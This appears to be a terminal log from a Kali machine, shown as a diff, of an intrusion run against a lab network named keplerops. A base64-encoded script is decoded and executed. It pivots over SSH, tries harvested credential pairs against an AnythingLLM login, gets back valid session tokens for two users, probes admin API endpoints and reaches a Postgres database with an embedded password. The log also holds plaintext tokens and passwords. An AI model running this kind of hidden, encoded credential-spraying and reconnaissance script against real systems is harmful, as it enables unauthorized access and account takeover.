@@ -1,0 +1,139 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r4.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKZWNobyAiIyMjIyMjIyMjIyBHSVRFQSBSRVBPUyIKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiB0b2tlbiBma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8iICJodHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdC9hcGkvdjEvdXNlci9yZXBvcz9saW1pdD01MCIgMj4mMSB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBqc29uLHN5cztkPWpzb24ubG9hZChzeXMuc3RkaW4pO1twcmludChyWyJmdWxsX25hbWUiXSxyLmdldCgiZGVzY3JpcHRpb24iKSkgZm9yIHIgaW4gZF0nIDI+JjEgfCBoZWFkIC00MAplY2hvICIjIyMjIyMjIyMjIEdJVEVBIE9SR1MiCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogdG9rZW4gZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiAiaHR0cHM6Ly9zb3VyY2Uua2VwbGVyb3BzLnRlc3QvYXBpL3YxL3VzZXIvb3Jncz9saW1pdD01MCIgMj4mMSB8IGhlYWQgLWMgMjAwMAplY2hvCmVjaG8gIiMjIyMjIyMjIyMgR0lURUEgU0VBUkNIIGNvZGUgYXNzaXN0YW50IgpjdXJsIC1zUyAtbSAyMCAtLWNhY2VydCAkQ0EgLUggIkF1dGhvcml6YXRpb246IHRva2VuIGZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIgImh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0L2FwaS92MS9yZXBvcy9zZWFyY2g/cT1hc3Npc3RhbnQmbGltaXQ9MjAiIDI+JjEgfCBoZWFkIC1jIDMwMDAKZWNobwplY2hvICIjIyMjIyMjIyMjIEFOWVRISU5HTExNIGxvZ2luIGF0dGVtcHRzIgpmb3IgdSBpbiAicm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIgInJvd2FuLml0bzpyb3dhbiIgImFkbWluOmFkbWluIiAibWF5YS5yYW5zY29tYmU6c1dRYTMxMDg1RlRRZWtaaEhUeFV5Zl85RTFtYXJxMHVyOFdOQ0ttVHRuayIgInJvd2FuLml0bzpmaWVsZGxpbmstZGV2LTI4NDEiOyBkbwogIGVjaG8gIi0tLSAkdSIKICBVPSR7dSUlOip9OyBQPSR7dSMqOn0KICBjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAie1widXNlcm5hbWVcIjpcIiRVXCIsXCJwYXNzd29yZFwiOlwiJFBcIn0iICIkQS9hcGkvcmVxdWVzdC10b2tlbiIgMj4mMSB8IGhlYWQgLWMgNDAwCiAgZWNobwpkb25lCmVjaG8gIiMjIyMjIyMjIyMgUFVCTElDIFBST0JFUyIKZm9yIHAgaW4gL2FwaS9yZXF1ZXN0LXRva2VuIC9hcGkvc3lzdGVtL2NoZWNrIC9hcGkvc2V0dXAtY29tcGxldGUgL2FwaS9waW5nIC9hcGkvd29ya3NwYWNlcyAvYXBpL3YxL3dvcmtzcGFjZXMgL2FwaS92MS93b3Jrc3BhY2UvZmllbGRsaW5rLW9wZXJhdGlvbnMgL2FwaS93b3Jrc3BhY2UvZmllbGRsaW5rLW9wZXJhdGlvbnMgL2FwaS9hZG1pbi93b3Jrc3BhY2VzIC9hcGkvdXNlcnMgL2FwaS91c2Vycy9tZSAvYXBpL3YxL2FkbWluL3VzZXJzIC9hcGkvYnJvd3Nlci1leHRlbnNpb24gL2FwaS9lbWJlZCAvYXBpL2FwaS1rZXk7IGRvCiAgZWNobyAiLS0tICRwIgogIGN1cmwgLXNTIC1tIDYgLS1jYWNlcnQgJENBIC1pICIkQSRwIiAyPiYxIHwgaGVhZCAtNgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgUEcgVEFCTEVTIgpQR1BBU1NXT1JEPWxvYmY5SnQwU0JXNDMzaW42d1VWbGtpeG5RcmVoNUstWjFMamJUb2ZycVkgcHNxbCAtaCBkYXRhLmtlcGxlcm9wcy50ZXN0IC1VIHJvd2FuX2RhdGEgLWQgZmllbGRsaW5rX2RhdGEgLWMgJ1xkdCcgMj4mMSB8IGhlYWQgLTQwCklOTkVSCmVjaG8gRE9ORV9NQVJLXyRSQU5ET00K
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r4.sh; bash /tmp/r4.sh; echo DONEMARK_1795199004313$((6*7))
+########## GITEA REPOS
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+TypeError: string indices must be integers, not 'str'
+########## GITEA ORGS
+{"message":"invalid username, password or token","url":"https://source.keplerops.test/api/swagger"}
+
+########## GITEA SEARCH code assistant
+{"message":"invalid username, password or token","url":"https://source.keplerops.test/api/swagger"}
+
+########## ANYTHINGLLM login attempts
+--- rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo
+{"valid":true,"user":{"id":2,"username":"rowan.ito","pfpFilename":null,"role":"default","suspended":0,"seen_recovery_codes":true,"createdAt":"2026-11-19T07:11:30.240Z","lastUpdatedAt":"2026-11-19T07:11:30.240Z","dailyMessageLimit":null,"bio":""},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyb3dhbi5pdG8iLCJpYXQiOjE3OTUxOTkwMTQsImV4cCI6MTc5Nzc5MTAxNH0.OkeOBctvyyrpr360XlA2
+--- rowan.ito:rowan
+{"user":null,"valid":false,"token":null,"message":"[001] Invalid login credentials."}
+--- admin:admin
+{"user":null,"valid":false,"token":null,"message":"[001] Invalid login credentials."}
+--- maya.ranscombe:sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk
+{"valid":true,"user":{"id":3,"username":"maya.ranscombe","pfpFilename":null,"role":"default","suspended":0,"seen_recovery_codes":false,"createdAt":"2026-11-19T07:11:30.336Z","lastUpdatedAt":"2026-11-19T07:11:30.336Z","dailyMessageLimit":null,"bio":""},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJtYXlhLnJhbnNjb21iZSIsImlhdCI6MTc5NTE5OTAxNSwiZXhwIjoxNzk3NzkxMDE1fQ.saLXJYt
+--- rowan.ito:fieldlink-dev-2841
+{"user":null,"valid":false,"token":null,"message":"[001] Invalid login credentials."}
+########## PUBLIC PROBES
+--- /api/request-token
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/system/check
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/setup-complete
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 4091
+Connection: keep-alive
+--- /api/ping
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 15
+Connection: keep-alive
+--- /api/workspaces
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 32
+Connection: keep-alive
+--- /api/v1/workspaces
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 35
+Connection: keep-alive
+--- /api/v1/workspace/fieldlink-operations
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 35
+Connection: keep-alive
+--- /api/workspace/fieldlink-operations
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 32
+Connection: keep-alive
+--- /api/admin/workspaces
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 32
+Connection: keep-alive
+--- /api/users
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/users/me
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/v1/admin/users
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 35
+Connection: keep-alive
+--- /api/browser-extension
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:35 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/embed
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:36 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+--- /api/api-key
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:23:36 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+########## PG TABLES
+Did not find any relations.
+DONE_MARK_25634
